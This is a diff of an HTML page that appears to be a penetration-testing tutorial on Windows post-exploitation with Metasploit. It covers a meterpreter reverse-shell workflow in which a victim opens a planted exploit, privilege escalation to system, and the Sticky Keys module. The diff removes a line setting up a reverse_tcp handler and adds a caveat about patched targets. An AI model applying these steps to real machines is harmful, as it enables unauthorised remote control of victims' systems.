@@ -3,8 +3,6 @@
 <hr/>
   <h2>Remote Shell Workflow</h2>
 <p>Follow the <a href=remote_shell_workflow1.html>remote shell workflow</a> to create an exploit and store it in /var/www/html/share</p>
-<p>Instead of using Listener port 4444, use 444 now !</p>
-<p>Run msfconsole; use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost [KALI IP]; set lport 444; run</p>
 <p>As soon as the victim downloads and opens the exploit, a meterpreter session will open</p>
 <p><ol>
   <ul>sysinfo</ul>
@@ -36,6 +34,8 @@
   <ul>getuid -> the meterpreter session is now running with system privileges</ul>
   <ul>background</ul>
 </ol></p>
+<p>The procedure above will NOT always work, depending of the fact if the OS on the target system is vulnerable or not. Some versions of Windows with some versions 
+of patches and service packs are simply NOT vulnerable and the procedure will fail. If the elevation process fails, try if you can use SHELL etc. anyway.</p>
 <h2>Sticky Keys</h2>
 <p>We will use sticky_keys module present in Metasploit to exploit the sticky keys feature in Windows.</p>
 <p><ol>
